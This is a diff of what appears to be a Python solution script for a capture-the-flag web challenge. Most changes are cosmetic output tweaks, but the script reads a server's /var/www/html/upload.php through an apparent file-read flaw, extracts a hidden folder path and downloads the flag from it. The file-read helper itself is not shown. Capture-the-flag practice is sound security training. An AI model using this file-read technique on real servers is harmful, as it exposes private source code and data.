@@ -31,18 +31,22 @@ def shell():
 
 
 def solve():
-    print(Figlet(font='slant', width=200).renderText("Manual for the apocalypse"))
+    print(Figlet(width=200).renderText("Manual for the apocalypse"))
 
     url_base = 'https://manual-for-the-apocalypse.secchallenge.crysys.hu/'
-    print(f'Url base: ' + url_base)
-    print(f'Obtaining source for upload.php...')
+    print(f'Using base url: ' + url_base)
+    print(f'👉 Obtaining source for upload.php...')
     src = read_file('/var/www/html/upload.php')
-    flag_location = re.search('"(very_secret_hidden_folder.*)"', src).group(1)
+    print(f'👉 Analysing...')
+    m = re.search('"(very_secret_hidden_folder.*)"', src)
+    if m:
+        flag_location = m.group(1)
+        flag_url = f'{url_base}/{flag_location}'
 
-    flag_url = f'{url_base}/{flag_location}'
-    print(f'Downloading flag from {flag_url}')
-    flag = requests.get(flag_url).text
-    print('Your flag is: ' + colorize(flag, ansi=2))
-
+        print(f'👉 Found flag location, downloading from {flag_url}')
+        flag = requests.get(flag_url).text
+        print('\n💣 Your flag is: ' + colorize(flag, ansi=2))
+    else:
+        print("Couldn't find flag")
 
 solve()
